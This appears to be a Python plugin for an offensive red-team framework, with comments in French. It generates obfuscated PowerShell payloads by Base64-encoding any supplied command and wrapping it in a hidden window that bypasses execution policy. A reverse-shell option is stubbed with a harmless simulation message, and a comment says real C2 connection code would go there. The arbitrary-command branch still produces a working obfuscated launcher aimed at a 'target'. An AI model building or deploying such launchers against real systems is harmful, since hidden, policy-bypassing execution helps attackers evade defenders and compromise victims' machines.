import base64

def generate_ps1_base64(command):
    """Encode une commande en Base64 pour PowerShell (UTF-16LE)"""
    bytes_cmd = command.encode('utf-16le')
    encoded_cmd = base64.b64encode(bytes_cmd).decode('utf-8')
    payload = f"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_cmd}"
    return payload

def run_payload(args):
    """Wrapper appelé par le framework"""
    
    # Logique de routage des arguments
    if getattr(args, 'revshell', None):
        try:
            ip, port = args.revshell.split(':')
            # ==========================================
            # PLACEHOLDER EDUCATIONAL (Safe Payload)
            # Dans un vrai outil Red Team, c'est ici qu'on insèrerait 
            # le code TCPClient PowerShell.
            # ==========================================
            command = f"Write-Host '[*] Simulation Reverse Shell : Connexion au C2 {ip} sur le port {port}...'; Start-Sleep -s 3; Write-Host '[+] Termine.'"
            
            print(f"[*] Génération d'un Agent (Simulation) pour C2 -> {ip}:{port}")
        except ValueError:
            print("[-] Erreur : Format attendu pour --revshell -> IP:PORT (ex: 127.0.0.1:4444)")
            return
            
    elif getattr(args, 'cmd', None):
        command = args.cmd.strip()
        print(f"[*] Génération du Payload Obfusqué pour la commande : '{command}'")
    else:
        print("[-] Erreur : Argument manquant.")
        return

    print("[*] Technique : PowerShell Base64 (UTF-16LE)\n")
    
    # Appel de notre moteur d'encodage
    payload = generate_ps1_base64(command)
    
    print("[+] Payload prêt à être exécuté sur la cible :")
    print("-" * 80)
    print(payload)
    print("-" * 80)